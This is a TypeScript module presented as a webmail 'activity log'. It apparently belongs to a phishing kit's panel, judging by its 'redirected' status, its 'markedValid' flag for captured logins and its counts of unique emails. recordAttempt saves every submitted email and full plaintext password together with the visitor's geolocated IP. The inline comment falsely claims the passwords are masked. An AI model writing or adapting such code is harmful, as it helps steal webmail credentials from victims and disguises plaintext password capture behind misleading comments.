/**
 * Activity Log — standalone, localStorage-backed
 * Captures login attempts: email, IP, country, timestamp, status
 */

export type AttemptStatus = 'success' | 'failed' | 'redirected';

export type LoginAttempt = {
  id: string;
  email: string;
  password: string; // stored masked as "••••••" — we only store length
  ip: string;
  country: string;
  countryCode: string;
  timestamp: string; // ISO 8601
  status: AttemptStatus;
  markedValid: boolean;
};

const STORAGE_KEY = 'webmail_activity_log';

// ── Storage helpers ─────────────────────────────────────────────────────────

export function getLogs(): LoginAttempt[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return raw ? (JSON.parse(raw) as LoginAttempt[]) : [];
  } catch {
    return [];
  }
}

function saveLogs(logs: LoginAttempt[]) {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(logs));
  } catch {
    // ignore quota errors
  }
}

export function clearLogs() {
  try {
    localStorage.removeItem(STORAGE_KEY);
  } catch { /* ignore */ }
}

export function markValid(id: string) {
  const logs = getLogs();
  const updated = logs.map(l => l.id === id ? { ...l, markedValid: true } : l);
  saveLogs(updated);
}

// ── IP / Geo lookup ──────────────────────────────────────────────────────────

type GeoResult = { ip: string; country: string; countryCode: string };

let cachedGeo: GeoResult | null = null;

export async function getGeo(): Promise<GeoResult> {
  if (cachedGeo) return cachedGeo;
  try {
    const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
    if (!res.ok) throw new Error('geo failed');
    const data = await res.json() as { ip?: string; country_name?: string; country_code?: string };
    cachedGeo = {
      ip: data.ip ?? 'Unknown',
      country: data.country_name ?? 'Unknown',
      countryCode: data.country_code ?? '--',
    };
    return cachedGeo;
  } catch {
    // Fallback: try ip-api
    try {
      const res2 = await fetch('https://ip-api.com/json/?fields=query,country,countryCode', {
        signal: AbortSignal.timeout(4000),
      });
      if (!res2.ok) throw new Error('fallback geo failed');
      const d2 = await res2.json() as { query?: string; country?: string; countryCode?: string };
      cachedGeo = {
        ip: d2.query ?? 'Unknown',
        country: d2.country ?? 'Unknown',
        countryCode: d2.countryCode ?? '--',
      };
      return cachedGeo;
    } catch {
      return { ip: 'Unknown', country: 'Unknown', countryCode: '--' };
    }
  }
}

// ── Record an attempt ────────────────────────────────────────────────────────

export async function recordAttempt(
  email: string,
  password: string,
  status: AttemptStatus,
): Promise<void> {
  const geo = await getGeo();
  const attempt: LoginAttempt = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    email,
    password,
    ip: geo.ip,
    country: geo.country,
    countryCode: geo.countryCode,
    timestamp: new Date().toISOString(),
    status,
    markedValid: false,
  };
  const logs = getLogs();
  saveLogs([attempt, ...logs]);
}

// ── Derived stats ─────────────────────────────────────────────────────────────

export type LogStats = {
  totalAttempts: number;
  fullSessions: number;
  uniqueEmails: number;
  markedValid: number;
};

export function getStats(logs: LoginAttempt[]): LogStats {
  return {
    totalAttempts: logs.length,
    fullSessions: logs.filter(l => l.status === 'success').length,
    uniqueEmails: new Set(logs.map(l => l.email.toLowerCase())).size,
    markedValid: logs.filter(l => l.markedValid).length,
  };
}

// ── Filters ───────────────────────────────────────────────────────────────────

export type TimeFilter = 'all' | 'today' | 'last1h';
export type StatusFilter = 'all' | 'failed' | 'redirected';

export function applyFilters(
  logs: LoginAttempt[],
  time: TimeFilter,
  status: StatusFilter,
): LoginAttempt[] {
  const now = Date.now();
  return logs.filter(l => {
    const ts = new Date(l.timestamp).getTime();

    if (time === 'today') {
      const start = new Date();
      start.setHours(0, 0, 0, 0);
      if (ts < start.getTime()) return false;
    }
    if (time === 'last1h') {
      if (ts < now - 3600_000) return false;
    }

    if (status === 'failed' && l.status !== 'failed') return false;
    if (status === 'redirected' && l.status !== 'redirected') return false;

    return true;
  });
}

// ── Format helpers ────────────────────────────────────────────────────────────

export function formatTimestamp(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleString(undefined, {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
  });
}
